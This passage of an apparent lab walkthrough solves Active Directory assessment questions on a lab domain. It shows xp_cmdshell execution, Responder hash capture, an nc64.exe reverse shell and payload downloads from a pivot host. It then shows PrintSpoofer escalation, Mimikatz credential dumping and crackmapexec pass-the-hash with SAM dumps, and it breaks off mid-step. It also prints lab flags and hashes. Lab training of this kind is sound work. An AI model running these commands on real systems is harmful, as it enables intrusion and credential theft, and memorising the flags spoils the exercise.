</span><span id="__span-308-20"><a id="__codelineno-308-20" name="__codelineno-308-20"></a><span class="c1"># Use `smbclient` to connect to the &quot;Department Shares&quot; directory:</span>
</span><span id="__span-308-21"><a id="__codelineno-308-21" name="__codelineno-308-21"></a>proxychains<span class="w"> </span>smbclient<span class="w"> </span><span class="s2">&quot;//172.16.7.3/Department Shares&quot;</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;inlanefreight\BR086&quot;</span>
</span><span id="__span-308-22"><a id="__codelineno-308-22" name="__codelineno-308-22"></a>
</span><span id="__span-308-23"><a id="__codelineno-308-23" name="__codelineno-308-23"></a><span class="c1"># Navigate to the desired path:</span>
</span><span id="__span-308-24"><a id="__codelineno-308-24" name="__codelineno-308-24"></a><span class="nb">cd</span><span class="w"> </span>IT/Private/Development
</span><span id="__span-308-25"><a id="__codelineno-308-25" name="__codelineno-308-25"></a>
</span><span id="__span-308-26"><a id="__codelineno-308-26" name="__codelineno-308-26"></a><span class="c1"># Retrieve the `web.config` file:</span>
</span><span id="__span-308-27"><a id="__codelineno-308-27" name="__codelineno-308-27"></a>get<span class="w"> </span>web.config
</span><span id="__span-308-28"><a id="__codelineno-308-28" name="__codelineno-308-28"></a>quit
</span><span id="__span-308-29"><a id="__codelineno-308-29" name="__codelineno-308-29"></a>
</span><span id="__span-308-30"><a id="__codelineno-308-30" name="__codelineno-308-30"></a><span class="c1"># View the contents of the retrieved file:</span>
</span><span id="__span-308-31"><a id="__codelineno-308-31" name="__codelineno-308-31"></a>cat<span class="w"> </span>web.config
</span></code></pre></div></td></tr></table></div>
<p>Results: D@ta_bAse_adm1n!
user: netdb</p>
<p><strong>Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-309-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-309-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-309-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-309-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-309-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-309-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-309-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-309-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-309-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-309-10">10</a></span>
<span class="normal"><a href="#__codelineno-309-11">11</a></span>
<span class="normal"><a href="#__codelineno-309-12">12</a></span>
<span class="normal"><a href="#__codelineno-309-13">13</a></span>
<span class="normal"><a href="#__codelineno-309-14">14</a></span>
<span class="normal"><a href="#__codelineno-309-15">15</a></span>
<span class="normal"><a href="#__codelineno-309-16">16</a></span>
<span class="normal"><a href="#__codelineno-309-17">17</a></span>
<span class="normal"><a href="#__codelineno-309-18">18</a></span>
<span class="normal"><a href="#__codelineno-309-19">19</a></span>
<span class="normal"><a href="#__codelineno-309-20">20</a></span>
<span class="normal"><a href="#__codelineno-309-21">21</a></span>
<span class="normal"><a href="#__codelineno-309-22">22</a></span>
<span class="normal"><a href="#__codelineno-309-23">23</a></span>
<span class="normal"><a href="#__codelineno-309-24">24</a></span>
<span class="normal"><a href="#__codelineno-309-25">25</a></span>
<span class="normal"><a href="#__codelineno-309-26">26</a></span>
<span class="normal"><a href="#__codelineno-309-27">27</a></span>
<span class="normal"><a href="#__codelineno-309-28">28</a></span>
<span class="normal"><a href="#__codelineno-309-29">29</a></span>
<span class="normal"><a href="#__codelineno-309-30">30</a></span>
<span class="normal"><a href="#__codelineno-309-31">31</a></span>
<span class="normal"><a href="#__codelineno-309-32">32</a></span>
<span class="normal"><a href="#__codelineno-309-33">33</a></span>
<span class="normal"><a href="#__codelineno-309-34">34</a></span>
<span class="normal"><a href="#__codelineno-309-35">35</a></span>
<span class="normal"><a href="#__codelineno-309-36">36</a></span>
<span class="normal"><a href="#__codelineno-309-37">37</a></span>
<span class="normal"><a href="#__codelineno-309-38">38</a></span>
<span class="normal"><a href="#__codelineno-309-39">39</a></span>
<span class="normal"><a href="#__codelineno-309-40">40</a></span>
<span class="normal"><a href="#__codelineno-309-41">41</a></span>
<span class="normal"><a href="#__codelineno-309-42">42</a></span>
<span class="normal"><a href="#__codelineno-309-43">43</a></span>
<span class="normal"><a href="#__codelineno-309-44">44</a></span>
<span class="normal"><a href="#__codelineno-309-45">45</a></span>
<span class="normal"><a href="#__codelineno-309-46">46</a></span>
<span class="normal"><a href="#__codelineno-309-47">47</a></span>
<span class="normal"><a href="#__codelineno-309-48">48</a></span>
<span class="normal"><a href="#__codelineno-309-49">49</a></span>
<span class="normal"><a href="#__codelineno-309-50">50</a></span>
<span class="normal"><a href="#__codelineno-309-51">51</a></span>
<span class="normal"><a href="#__codelineno-309-52">52</a></span>
<span class="normal"><a href="#__codelineno-309-53">53</a></span>
<span class="normal"><a href="#__codelineno-309-54">54</a></span>
<span class="normal"><a href="#__codelineno-309-55">55</a></span>
<span class="normal"><a href="#__codelineno-309-56">56</a></span>
<span class="normal"><a href="#__codelineno-309-57">57</a></span>
<span class="normal"><a href="#__codelineno-309-58">58</a></span>
<span class="normal"><a href="#__codelineno-309-59">59</a></span>
<span class="normal"><a href="#__codelineno-309-60">60</a></span>
<span class="normal"><a href="#__codelineno-309-61">61</a></span>
<span class="normal"><a href="#__codelineno-309-62">62</a></span>
<span class="normal"><a href="#__codelineno-309-63">63</a></span>
<span class="normal"><a href="#__codelineno-309-64">64</a></span>
<span class="normal"><a href="#__codelineno-309-65">65</a></span>
<span class="normal"><a href="#__codelineno-309-66">66</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-309-1"><a id="__codelineno-309-1" name="__codelineno-309-1"></a><span class="c1"># Using the user credentials from the previous exercise, we access the MSSQL database:</span>
</span><span id="__span-309-2"><a id="__codelineno-309-2" name="__codelineno-309-2"></a>proxychains<span class="w"> </span>sqsh<span class="w"> </span>-S<span class="w"> </span><span class="m">172</span>.16.7.60<span class="w"> </span>-U<span class="w"> </span>netdb<span class="w"> </span>-P<span class="w"> </span><span class="s1">&#39;D@ta_bAse_adm1n!&#39;</span><span class="w"> </span>-h
</span><span id="__span-309-3"><a id="__codelineno-309-3" name="__codelineno-309-3"></a>
</span><span id="__span-309-4"><a id="__codelineno-309-4" name="__codelineno-309-4"></a><span class="c1"># Attempting to access the flag, but we lack the necessary permissions:</span>
</span><span id="__span-309-5"><a id="__codelineno-309-5" name="__codelineno-309-5"></a>EXEC<span class="w"> </span>xp_cmdshell<span class="w"> </span><span class="s1">&#39;type c:\Users\Administrator\Desktop\flag.txt&#39;</span>
</span><span id="__span-309-6"><a id="__codelineno-309-6" name="__codelineno-309-6"></a>go
</span><span id="__span-309-7"><a id="__codelineno-309-7" name="__codelineno-309-7"></a>
</span><span id="__span-309-8"><a id="__codelineno-309-8" name="__codelineno-309-8"></a><span class="c1"># Next, we will execute an attack to capture the MSSQL Service Hash.</span>
</span><span id="__span-309-9"><a id="__codelineno-309-9" name="__codelineno-309-9"></a><span class="c1"># First, we will run Responder on the Parrot pivot machine (172.16.7.240):</span>
</span><span id="__span-309-10"><a id="__codelineno-309-10" name="__codelineno-309-10"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0
</span><span id="__span-309-11"><a id="__codelineno-309-11" name="__codelineno-309-11"></a>
</span><span id="__span-309-12"><a id="__codelineno-309-12" name="__codelineno-309-12"></a><span class="c1"># Then, from the database connection, we will attempt to connect to a share:</span>
</span><span id="__span-309-13"><a id="__codelineno-309-13" name="__codelineno-309-13"></a>EXEC<span class="w"> </span>master..xp_dirtree<span class="w"> </span><span class="s1">&#39;\\172.16.7.240\share\&#39;</span>
</span><span id="__span-309-14"><a id="__codelineno-309-14" name="__codelineno-309-14"></a>
</span><span id="__span-309-15"><a id="__codelineno-309-15" name="__codelineno-309-15"></a><span class="c1"># Responder will capture the hash:</span>
</span><span id="__span-309-16"><a id="__codelineno-309-16" name="__codelineno-309-16"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Client<span class="w">   </span>:<span class="w"> </span><span class="m">172</span>.16.7.60
</span><span id="__span-309-17"><a id="__codelineno-309-17" name="__codelineno-309-17"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>INLANEFREIGHT<span class="se">\S</span>QL01$
</span><span id="__span-309-18"><a id="__codelineno-309-18" name="__codelineno-309-18"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Hash<span class="w">     </span>:<span class="w"> </span>SQL01$::INLANEFREIGHT:990b191e92859598:DF973B2CBBD93043B5EDFFF6759136CC:01010000000000000022FC45F460DB018568A6F6B8DD56FA0000000002000800590032004200300001001E00570049004E002D004E004100370059004A004100480045004E003300550004003400570049004E002D004E004100370059004A004100480045004E00330055002E0059003200420030002E004C004F00430041004C000300140059003200420030002E004C004F00430041004C000500140059003200420030002E004C004F00430041004C00070008000022FC45F460DB0106000400020000000800300030000000000000000000000000300000011450EFCD9DCCD865F6DC7EB88F78C1416D20A04A5E33C2E24A3FD09103F3C70A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0037002E003200340030000000000000000000
</span><span id="__span-309-19"><a id="__codelineno-309-19" name="__codelineno-309-19"></a>
</span><span id="__span-309-20"><a id="__codelineno-309-20" name="__codelineno-309-20"></a><span class="c1"># However, this doesn&#39;t yield any results (I attempted to access services/machines using CrackMapExec). So, I eventually obtained a simple reverse shell by exploiting the SQL server to enumerate more easily.</span>
</span><span id="__span-309-21"><a id="__codelineno-309-21" name="__codelineno-309-21"></a><span class="c1"># First, I uploaded nc64.exe to the pivot host (172.16.7.240). Then, I served the file to 172.16.7.60:</span>
</span><span id="__span-309-22"><a id="__codelineno-309-22" name="__codelineno-309-22"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">9001</span>
</span><span id="__span-309-23"><a id="__codelineno-309-23" name="__codelineno-309-23"></a>
</span><span id="__span-309-24"><a id="__codelineno-309-24" name="__codelineno-309-24"></a><span class="c1"># From the terminal with the connection to the server (172.16.7.60), I uploaded the file to SQL01:</span>
</span><span id="__span-309-25"><a id="__codelineno-309-25" name="__codelineno-309-25"></a>xp_cmdshell<span class="w"> </span><span class="s2">&quot;powershell -c cd C:\Users\Public\Downloads; Invoke-WebRequest http://172.16.7.240:9001/nc64.exe -outfile nc64.exe&quot;</span>
</span><span id="__span-309-26"><a id="__codelineno-309-26" name="__codelineno-309-26"></a>go<span class="w"> </span>
</span><span id="__span-309-27"><a id="__codelineno-309-27" name="__codelineno-309-27"></a>
</span><span id="__span-309-28"><a id="__codelineno-309-28" name="__codelineno-309-28"></a><span class="c1"># Verify the file has been uploaded:</span>
</span><span id="__span-309-29"><a id="__codelineno-309-29" name="__codelineno-309-29"></a>xp_cmdshell<span class="w"> </span><span class="s2">&quot;powershell -c dir C:\Users\Public\Downloads&quot;</span>
</span><span id="__span-309-30"><a id="__codelineno-309-30" name="__codelineno-309-30"></a>go<span class="w"> </span>
</span><span id="__span-309-31"><a id="__codelineno-309-31" name="__codelineno-309-31"></a>
</span><span id="__span-309-32"><a id="__codelineno-309-32" name="__codelineno-309-32"></a><span class="c1"># Start a listener on the Parrot pivot machine (172.16.7.240):</span>
</span><span id="__span-309-33"><a id="__codelineno-309-33" name="__codelineno-309-33"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">5665</span>
</span><span id="__span-309-34"><a id="__codelineno-309-34" name="__codelineno-309-34"></a>
</span><span id="__span-309-35"><a id="__codelineno-309-35" name="__codelineno-309-35"></a><span class="c1"># Now, establish the reverse connection:</span>
</span><span id="__span-309-36"><a id="__codelineno-309-36" name="__codelineno-309-36"></a>xp_cmdshell<span class="w"> </span><span class="s2">&quot;powershell -c cd C:\Users\Public\Downloads; .\nc64.exe -e cmd.exe 172.16.7.240 5665&quot;</span>
</span><span id="__span-309-37"><a id="__codelineno-309-37" name="__codelineno-309-37"></a>
</span><span id="__span-309-38"><a id="__codelineno-309-38" name="__codelineno-309-38"></a><span class="c1"># On the Parrot pivot machine, we now have a reverse shell from 172.16.7.60. We can begin enumeration.</span>
</span><span id="__span-309-39"><a id="__codelineno-309-39" name="__codelineno-309-39"></a>whoami<span class="w"> </span>/priv
</span><span id="__span-309-40"><a id="__codelineno-309-40" name="__codelineno-309-40"></a>
</span><span id="__span-309-41"><a id="__codelineno-309-41" name="__codelineno-309-41"></a><span class="c1"># We will notice the following privileges:</span>
</span><span id="__span-309-42"><a id="__codelineno-309-42" name="__codelineno-309-42"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                               </span><span class="nv">State</span><span class="w">   </span>
</span><span id="__span-309-43"><a id="__codelineno-309-43" name="__codelineno-309-43"></a><span class="o">=============================</span><span class="w"> </span><span class="o">=========================================</span><span class="w"> </span><span class="o">========</span>
</span><span id="__span-309-44"><a id="__codelineno-309-44" name="__codelineno-309-44"></a>SeAssignPrimaryTokenPrivilege<span class="w"> </span>Replace<span class="w"> </span>a<span class="w"> </span>process-level<span class="w"> </span>token<span class="w">             </span>Disabled
</span><span id="__span-309-45"><a id="__codelineno-309-45" name="__codelineno-309-45"></a>SeIncreaseQuotaPrivilege<span class="w">      </span>Adjust<span class="w"> </span>memory<span class="w"> </span>quotas<span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>process<span class="w">        </span>Disabled
</span><span id="__span-309-46"><a id="__codelineno-309-46" name="__codelineno-309-46"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">                  </span>Enabled<span class="w"> </span>
</span><span id="__span-309-47"><a id="__codelineno-309-47" name="__codelineno-309-47"></a>SeImpersonatePrivilege<span class="w">        </span>Impersonate<span class="w"> </span>a<span class="w"> </span>client<span class="w"> </span>after<span class="w"> </span>authentication<span class="w"> </span>Enabled<span class="w"> </span>
</span><span id="__span-309-48"><a id="__codelineno-309-48" name="__codelineno-309-48"></a>SeCreateGlobalPrivilege<span class="w">       </span>Create<span class="w"> </span>global<span class="w"> </span>objects<span class="w">                     </span>Enabled<span class="w"> </span>
</span><span id="__span-309-49"><a id="__codelineno-309-49" name="__codelineno-309-49"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w">            </span>Disabled
</span><span id="__span-309-50"><a id="__codelineno-309-50" name="__codelineno-309-50"></a>
</span><span id="__span-309-51"><a id="__codelineno-309-51" name="__codelineno-309-51"></a><span class="c1"># We will exploit SeImpersonatePrivilege, which allows us to elevate from LOCAL/NETWORK SERVICE to SYSTEM by leveraging the PrintSpoofer vulnerability on Windows 10 and Server 2016/2019.</span>
</span><span id="__span-309-52"><a id="__codelineno-309-52" name="__codelineno-309-52"></a>
</span><span id="__span-309-53"><a id="__codelineno-309-53" name="__codelineno-309-53"></a><span class="c1"># On your Kali machine, download the PrintSpoofer executable from https://github.com/itm4n/PrintSpoofer. Transfer the file to the Parrot pivot host (172.16.7.240). Then, on the Parrot pivot host, serve the file:</span>
</span><span id="__span-309-54"><a id="__codelineno-309-54" name="__codelineno-309-54"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">9001</span>
</span><span id="__span-309-55"><a id="__codelineno-309-55" name="__codelineno-309-55"></a>
</span><span id="__span-309-56"><a id="__codelineno-309-56" name="__codelineno-309-56"></a><span class="c1"># From the reverse shell terminal (172.16.7.60), download the file:</span>
</span><span id="__span-309-57"><a id="__codelineno-309-57" name="__codelineno-309-57"></a>powershell<span class="w"> </span>-c<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\P</span>ublic<span class="se">\D</span>ownloads<span class="p">;</span><span class="w">  </span>Invoke-WebRequest<span class="w"> </span>http://172.16.7.240:9001/PrintSpoofer64.exe<span class="w"> </span>-outfile<span class="w"> </span>PrintSpoofer64.exe
</span><span id="__span-309-58"><a id="__codelineno-309-58" name="__codelineno-309-58"></a>
</span><span id="__span-309-59"><a id="__codelineno-309-59" name="__codelineno-309-59"></a><span class="c1"># From the reverse shell terminal (172.16.7.60), execute the PrintSpoofer tool:</span>
</span><span id="__span-309-60"><a id="__codelineno-309-60" name="__codelineno-309-60"></a>.<span class="se">\P</span>rintSpoofer64.exe<span class="w"> </span>-i<span class="w"> </span>-c<span class="w"> </span>cmd.exe
</span><span id="__span-309-61"><a id="__codelineno-309-61" name="__codelineno-309-61"></a>
</span><span id="__span-309-62"><a id="__codelineno-309-62" name="__codelineno-309-62"></a><span class="c1"># Verify the current user:</span>
</span><span id="__span-309-63"><a id="__codelineno-309-63" name="__codelineno-309-63"></a>whoami
</span><span id="__span-309-64"><a id="__codelineno-309-64" name="__codelineno-309-64"></a>
</span><span id="__span-309-65"><a id="__codelineno-309-65" name="__codelineno-309-65"></a><span class="c1"># Finally, retrieve the flag:</span>
</span><span id="__span-309-66"><a id="__codelineno-309-66" name="__codelineno-309-66"></a><span class="nb">type</span><span class="w"> </span>c:/Users/Administrator/Desktop/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  s3imp3rs0nate_cl@ssic</p>
<p><strong>Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-310-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-310-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-310-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-310-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-310-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-310-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-310-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-310-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-310-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-310-10">10</a></span>
<span class="normal"><a href="#__codelineno-310-11">11</a></span>
<span class="normal"><a href="#__codelineno-310-12">12</a></span>
<span class="normal"><a href="#__codelineno-310-13">13</a></span>
<span class="normal"><a href="#__codelineno-310-14">14</a></span>
<span class="normal"><a href="#__codelineno-310-15">15</a></span>
<span class="normal"><a href="#__codelineno-310-16">16</a></span>
<span class="normal"><a href="#__codelineno-310-17">17</a></span>
<span class="normal"><a href="#__codelineno-310-18">18</a></span>
<span class="normal"><a href="#__codelineno-310-19">19</a></span>
<span class="normal"><a href="#__codelineno-310-20">20</a></span>
<span class="normal"><a href="#__codelineno-310-21">21</a></span>
<span class="normal"><a href="#__codelineno-310-22">22</a></span>
<span class="normal"><a href="#__codelineno-310-23">23</a></span>
<span class="normal"><a href="#__codelineno-310-24">24</a></span>
<span class="normal"><a href="#__codelineno-310-25">25</a></span>
<span class="normal"><a href="#__codelineno-310-26">26</a></span>
<span class="normal"><a href="#__codelineno-310-27">27</a></span>
<span class="normal"><a href="#__codelineno-310-28">28</a></span>
<span class="normal"><a href="#__codelineno-310-29">29</a></span>
<span class="normal"><a href="#__codelineno-310-30">30</a></span>
<span class="normal"><a href="#__codelineno-310-31">31</a></span>
<span class="normal"><a href="#__codelineno-310-32">32</a></span>
<span class="normal"><a href="#__codelineno-310-33">33</a></span>
<span class="normal"><a href="#__codelineno-310-34">34</a></span>
<span class="normal"><a href="#__codelineno-310-35">35</a></span>
<span class="normal"><a href="#__codelineno-310-36">36</a></span>
<span class="normal"><a href="#__codelineno-310-37">37</a></span>
<span class="normal"><a href="#__codelineno-310-38">38</a></span>
<span class="normal"><a href="#__codelineno-310-39">39</a></span>
<span class="normal"><a href="#__codelineno-310-40">40</a></span>
<span class="normal"><a href="#__codelineno-310-41">41</a></span>
<span class="normal"><a href="#__codelineno-310-42">42</a></span>
<span class="normal"><a href="#__codelineno-310-43">43</a></span>
<span class="normal"><a href="#__codelineno-310-44">44</a></span>
<span class="normal"><a href="#__codelineno-310-45">45</a></span>
<span class="normal"><a href="#__codelineno-310-46">46</a></span>
<span class="normal"><a href="#__codelineno-310-47">47</a></span>
<span class="normal"><a href="#__codelineno-310-48">48</a></span>
<span class="normal"><a href="#__codelineno-310-49">49</a></span>
<span class="normal"><a href="#__codelineno-310-50">50</a></span>
<span class="normal"><a href="#__codelineno-310-51">51</a></span>
<span class="normal"><a href="#__codelineno-310-52">52</a></span>
<span class="normal"><a href="#__codelineno-310-53">53</a></span>
<span class="normal"><a href="#__codelineno-310-54">54</a></span>
<span class="normal"><a href="#__codelineno-310-55">55</a></span>
<span class="normal"><a href="#__codelineno-310-56">56</a></span>
<span class="normal"><a href="#__codelineno-310-57">57</a></span>
<span class="normal"><a href="#__codelineno-310-58">58</a></span>
<span class="normal"><a href="#__codelineno-310-59">59</a></span>
<span class="normal"><a href="#__codelineno-310-60">60</a></span>
<span class="normal"><a href="#__codelineno-310-61">61</a></span>
<span class="normal"><a href="#__codelineno-310-62">62</a></span>
<span class="normal"><a href="#__codelineno-310-63">63</a></span>
<span class="normal"><a href="#__codelineno-310-64">64</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-310-1"><a id="__codelineno-310-1" name="__codelineno-310-1"></a># We have gained admin rights on the host SQL01 (172.16.7.60). From there, we will use Mimikatz. To do so, we need to transfer the Mimikatz executable from our Kali machine to the Parrot pivot machine.
</span><span id="__span-310-2"><a id="__codelineno-310-2" name="__codelineno-310-2"></a># On Kali:
</span><span id="__span-310-3"><a id="__codelineno-310-3" name="__codelineno-310-3"></a>python3 -m http.server 9001
</span><span id="__span-310-4"><a id="__codelineno-310-4" name="__codelineno-310-4"></a>
</span><span id="__span-310-5"><a id="__codelineno-310-5" name="__codelineno-310-5"></a># On the Parrot pivot machine:
</span><span id="__span-310-6"><a id="__codelineno-310-6" name="__codelineno-310-6"></a>wget http://10.10.15.140:9001/mimikatz.exe
</span><span id="__span-310-7"><a id="__codelineno-310-7" name="__codelineno-310-7"></a>
</span><span id="__span-310-8"><a id="__codelineno-310-8" name="__codelineno-310-8"></a># Now, we will serve the file from the Parrot pivot machine:
</span><span id="__span-310-9"><a id="__codelineno-310-9" name="__codelineno-310-9"></a>python3 -m http.server 9001
</span><span id="__span-310-10"><a id="__codelineno-310-10" name="__codelineno-310-10"></a>
</span><span id="__span-310-11"><a id="__codelineno-310-11" name="__codelineno-310-11"></a># From the reverse shell on SQL01 (172.16.7.60), open PowerShell and download the file:
</span><span id="__span-310-12"><a id="__codelineno-310-12" name="__codelineno-310-12"></a>powershell
</span><span id="__span-310-13"><a id="__codelineno-310-13" name="__codelineno-310-13"></a>certutil -urlcache -split -f http://172.16.7.240:9001/mimikatz.exe mimikatz.exe
</span><span id="__span-310-14"><a id="__codelineno-310-14" name="__codelineno-310-14"></a>
</span><span id="__span-310-15"><a id="__codelineno-310-15" name="__codelineno-310-15"></a># Run Mimikatz and list the users logged into the machine and still in memory:
</span><span id="__span-310-16"><a id="__codelineno-310-16" name="__codelineno-310-16"></a>.\mimikatz.exe
</span><span id="__span-310-17"><a id="__codelineno-310-17" name="__codelineno-310-17"></a>privilege::debug
</span><span id="__span-310-18"><a id="__codelineno-310-18" name="__codelineno-310-18"></a>token::elevate
</span><span id="__span-310-19"><a id="__codelineno-310-19" name="__codelineno-310-19"></a>sekurlsa::logonPasswords full
</span><span id="__span-310-20"><a id="__codelineno-310-20" name="__codelineno-310-20"></a>
</span><span id="__span-310-21"><a id="__codelineno-310-21" name="__codelineno-310-21"></a># We will notice this user with the NTLM hash:
</span><span id="__span-310-22"><a id="__codelineno-310-22" name="__codelineno-310-22"></a># mssqlsvc
</span><span id="__span-310-23"><a id="__codelineno-310-23" name="__codelineno-310-23"></a># NTLM: 8c9555327d95f815987c0d81238c7660
</span><span id="__span-310-24"><a id="__codelineno-310-24" name="__codelineno-310-24"></a>
</span><span id="__span-310-25"><a id="__codelineno-310-25" name="__codelineno-310-25"></a>####### Way 1
</span><span id="__span-310-26"><a id="__codelineno-310-26" name="__codelineno-310-26"></a># Now, from our Kali machine, we will use the SSH reverse proxy established earlier with `ssh $user@$ip -D 9050` to access the MS01 target machine. We will use the Pass-The-Hash technique:
</span><span id="__span-310-27"><a id="__codelineno-310-27" name="__codelineno-310-27"></a>proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL 
</span><span id="__span-310-28"><a id="__codelineno-310-28" name="__codelineno-310-28"></a>
</span><span id="__span-310-29"><a id="__codelineno-310-29" name="__codelineno-310-29"></a># Dumping SAM hashes:
</span><span id="__span-310-30"><a id="__codelineno-310-30" name="__codelineno-310-30"></a>proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL --sam
</span><span id="__span-310-31"><a id="__codelineno-310-31" name="__codelineno-310-31"></a>
</span><span id="__span-310-32"><a id="__codelineno-310-32" name="__codelineno-310-32"></a>########
</span><span id="__span-310-33"><a id="__codelineno-310-33" name="__codelineno-310-33"></a># SMB         172.16.7.50     445    MS01             [+] Dumping SAM hashes
</span><span id="__span-310-34"><a id="__codelineno-310-34" name="__codelineno-310-34"></a># SMB         172.16.7.50     445    MS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
</span><span id="__span-310-35"><a id="__codelineno-310-35" name="__codelineno-310-35"></a># SMB         172.16.7.50     445    MS01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-310-36"><a id="__codelineno-310-36" name="__codelineno-310-36"></a># SMB         172.16.7.50     445    MS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-310-37"><a id="__codelineno-310-37" name="__codelineno-310-37"></a># SMB         172.16.7.50     445    MS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
</span><span id="__span-310-38"><a id="__codelineno-310-38" name="__codelineno-310-38"></a># SMB         172.16.7.50     445    MS01             [+] Added 4 SAM hashes to the database
</span><span id="__span-310-39"><a id="__codelineno-310-39" name="__codelineno-310-39"></a>##########
</span><span id="__span-310-40"><a id="__codelineno-310-40" name="__codelineno-310-40"></a>
</span><span id="__span-310-41"><a id="__codelineno-310-41" name="__codelineno-310-41"></a># NTDS dump:
</span><span id="__span-310-42"><a id="__codelineno-310-42" name="__codelineno-310-42"></a>proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL --ntds
</span><span id="__span-310-43"><a id="__codelineno-310-43" name="__codelineno-310-43"></a>#### [+] Dumped 0 NTDS hashes
</span><span id="__span-310-44"><a id="__codelineno-310-44" name="__codelineno-310-44"></a>
</span><span id="__span-310-45"><a id="__codelineno-310-45" name="__codelineno-310-45"></a># Now, we can extract the flag:
</span><span id="__span-310-46"><a id="__codelineno-310-46" name="__codelineno-310-46"></a># First, check the user:
</span><span id="__span-310-47"><a id="__codelineno-310-47" name="__codelineno-310-47"></a>proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H bdaffbfe64f1fc646a3353be1c2c3c99 -d INLANEFREIGHT.LOCAL  -x &#39;whoami&#39; --exec-method smbexec
</span><span id="__span-310-48"><a id="__codelineno-310-48" name="__codelineno-310-48"></a># Result: nt authority\system
</span><span id="__span-310-49"><a id="__codelineno-310-49" name="__codelineno-310-49"></a>
</span><span id="__span-310-50"><a id="__codelineno-310-50" name="__codelineno-310-50"></a># Now, print the flag.txt:
</span><span id="__span-310-51"><a id="__codelineno-310-51" name="__codelineno-310-51"></a>proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL  -x &#39;type c:\Users\Administrator\Desktop\flag.txt&#39; --exec-method smbexec
</span><span id="__span-310-52"><a id="__codelineno-310-52" name="__codelineno-310-52"></a>
</span><span id="__span-310-53"><a id="__codelineno-310-53" name="__codelineno-310-53"></a>####### Way 2
</span><span id="__span-310-54"><a id="__codelineno-310-54" name="__codelineno-310-54"></a># Another way is to open an RDP connection using Pass-the-Hash:
</span><span id="__span-310-55"><a id="__codelineno-310-55" name="__codelineno-310-55"></a>proxychains xfreerdp /v:172.16.7.50 /u:mssqlsvc /pth:8c9555327d95f815987c0d81238c7660 /cert-ignore
</span><span id="__span-310-56"><a id="__codelineno-310-56" name="__codelineno-310-56"></a>
</span><span id="__span-310-57"><a id="__codelineno-310-57" name="__codelineno-310-57"></a># We encounter an issue: **Restricted Admin Mode** is disabled by default on the target host, which results in an error. To proceed, we need to enable this mode. 
</span><span id="__span-310-58"><a id="__codelineno-310-58" name="__codelineno-310-58"></a># As we have command execution access via CrackMapExec on 172.16.7.50, we will add a registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with a value of 0.
